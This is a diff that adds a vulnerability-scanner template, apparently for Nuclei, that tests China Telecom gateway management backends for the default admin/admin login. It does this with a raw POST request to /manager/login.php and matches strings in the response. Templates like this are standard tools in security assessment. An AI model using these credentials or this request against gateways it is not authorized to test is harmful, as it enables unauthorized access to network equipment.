@@ -1,0 +1,39 @@
+id: telecom-gateway-default-login
+info:
+  name: Telecom Gateway Default Login
+  author:
+  - l0ne1y
+  description: |-
+    China Telecom gateway configuration management system weak password
+    The China Telecom gateway configuration management system has default weak credentials, allowing attackers to use the admin/admin username and password to enter the backend, thereby threatening the security of the system and its data.
+  severity: high
+  remediation: |-
+    #### Official remedy:
+    Upgrade the system to a non-vulnerable version, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - <title>电信网关服务器管理后台</title>
+    - index-shang.php
+    - di.php
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /manager/login.php HTTP/1.1
+    Host: {{Hostname}}
+
+    Name={{username}}&Pass={{password}}
+  attack: pitchfork
+  payloads:
+    password:
+    - admin
+    username:
+    - admin
+  max-redirects: 2
+  redirects: true
